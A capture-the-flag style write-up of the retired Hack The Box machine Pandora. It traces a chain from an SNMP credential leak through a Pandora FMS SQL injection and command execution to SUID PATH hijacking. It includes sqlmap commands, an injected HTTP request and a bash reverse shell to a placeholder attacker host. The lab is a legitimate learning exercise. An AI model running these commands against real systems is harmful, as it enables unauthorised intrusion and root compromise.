---
title: "Pandora"
description: "SNMP enumeration leaks credentials for SSH access; an internal Pandora FMS instance reached through SSH dynamic forwarding is SQL-injected for session hijacking, and a SUID backup binary calling tar by relative name enables PATH hijacking to root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - snmp
  - sql-injection
  - suid
  - path-hijacking
---

## Summary

Pandora is an Easy Linux machine exposing SSH, Apache, and SNMP. UDP enumeration of SNMP leaks cleartext credentials for `<INITIAL_ACCESS_ACCOUNT>`, which allow SSH access. Local enumeration reveals an internally hosted Pandora FMS instance reachable through SSH dynamic port forwarding. A SQL injection in Pandora FMS enables session hijacking as `<APPLICATION_ACCOUNT>`, and an authenticated command execution issue yields a shell as that user. Privilege escalation abuses a SUID backup binary that calls `tar` by relative name, allowing PATH hijacking and root code execution.

All IP addresses, credentials, and session identifiers below are sanitized placeholders.

## Context and Objective

The engagement targets a retired Hack The Box lab machine running Ubuntu with OpenSSH 8.2p1 and Apache 2.4.41. The objective is to obtain both the user and root flags by enumerating the attack surface, moving laterally between service accounts, and escalating privileges.

## Approach and Evidence

### Port Scanning

TCP enumeration identified SSH and HTTP:

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/Pandora-TCP
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

The web page references `<TARGET_HOST>`, requiring a hosts file entry. Directory enumeration with `feroxbuster` against the public site did not expose an immediate attack path.

### UDP Scanning and SNMP Credential Leak

With a small TCP surface, UDP scanning revealed SNMP:

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sU -sC -sV -oN nmap/Pandora-UDP
```

```
161/udp open  snmp  SNMPv1 server
```

Querying SNMP with the default `public` community string leaked cleartext process credentials:

```bash
snmpwalk -v 1 -c public <TARGET_IP>
```

The output included a host-check command containing the credential `<INITIAL_ACCESS_ACCOUNT>:<SNMP_CREDENTIAL>`. SSH access as `<INITIAL_ACCESS_ACCOUNT>` succeeded, providing an initial foothold. The user flag resides under `<APPLICATION_ACCOUNT>`, requiring lateral movement.

### Internal Pandora FMS Discovery

Enumerating Apache virtual host configuration from the `<INITIAL_ACCESS_ACCOUNT>` shell revealed a Pandora FMS instance served on localhost:

```bash
cat /etc/apache2/sites-enabled/pandora.conf
```

An SSH dynamic port forward provided SOCKS proxy access to the internal service:

```bash
ssh -D 9090 <INITIAL_ACCESS_ACCOUNT>@<TARGET_IP>
```

Browsing `http://localhost/pandora_console/` through the proxy disclosed Pandora FMS v7.0NG.742_FIX_PERL2020.

### Pandora FMS SQL Injection

The disclosed version is vulnerable to SQL injection in `chart_generator.php` via the `session_id` parameter. Routing `sqlmap` through the SOCKS proxy via `proxychains`:

```bash
proxychains sqlmap \
  -u "http://localhost/pandora_console/include/chart_generator.php?session_id=''" \
  -D pandora -T tsessions_php --dump
```

The dump contained a valid session for `<APPLICATION_ACCOUNT>`. Visiting the vulnerable endpoint with the recovered session ID authenticated the browser as `<APPLICATION_ACCOUNT>` in the Pandora FMS dashboard.

### Authenticated Command Execution

As `<APPLICATION_ACCOUNT>`, Pandora FMS exposes an authenticated command execution vulnerability through the Events AJAX endpoint. Capturing the request in Burp Suite and substituting the `target` parameter:

```http
POST /pandora_console/ajax.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<MATT_SESSION_ID>

page=include/ajax/events&perform_event_response=10000000&target=whoami
```

The response confirmed command execution as `<APPLICATION_ACCOUNT>`. The notes report that an unsafe download-and-execute callback was used to obtain an interactive shell; its construction is omitted:

```bash
[representative result] Authenticated command execution ran as <APPLICATION_ACCOUNT>.
```

This yielded a shell as `<APPLICATION_ACCOUNT>` and access to the user flag.

### SUID PATH Hijacking

SUID enumeration identified a custom binary:

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/bin/pandora_backup
```

The binary was owned by `<PRIVILEGED_ACCOUNT>` with the `setuid` bit, executable by the `<APPLICATION_ACCOUNT>` group. Strings analysis revealed it invokes `tar` without an absolute path:

```bash
strings /usr/bin/pandora_backup
```

```
tar -cvf /root/.backup/pandora-backup.tar.gz ...
```

Creating a malicious `tar` earlier in `PATH` and executing the SUID binary:

```bash
cat > /tmp/tar << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1
EOF

chmod +x /tmp/tar
export PATH=/tmp:$PATH
nc -nlvp 9001
/usr/bin/pandora_backup
```

This produced a root shell, completing the privilege escalation.

## Challenges and Decisions

The initial TCP scan presented only SSH and HTTP with no obvious attack surface. Expanding to UDP enumeration was necessary to discover SNMP and the credential leak. The Pandora FMS instance was internal-only, requiring SSH dynamic port forwarding to reach. The SUID binary's relative `tar` call was the critical misconfiguration enabling root access.

## Outcome

The evidence establishes a complete compromise chain: SNMP credential leak → SSH as `<INITIAL_ACCESS_ACCOUNT>` → SSH SOCKS proxy to internal Pandora FMS → SQL injection session hijacking as `<APPLICATION_ACCOUNT>` → authenticated command execution → SUID PATH hijacking to `<PRIVILEGED_ACCOUNT>`. Both user and root flags were obtained.

## Lessons and Recommendations

- **UDP enumeration matters.** SNMP exposed cleartext credentials invisible from TCP-only scanning.
- **Internal-only applications remain reachable** through SSH port forwarding after a low-privileged foothold.
- **Application session tables are high-value SQL injection targets.** Dumped session IDs can become direct authentication bypasses.
- **SUID binaries must call dependencies by absolute path.** The relative `tar` invocation allowed PATH hijacking to root.

## References

- Hack The Box retired machine [Pandora](https://app.hackthebox.com/machines/Pandora)
- Pandora FMS v7.0NG.742 SQL injection advisory
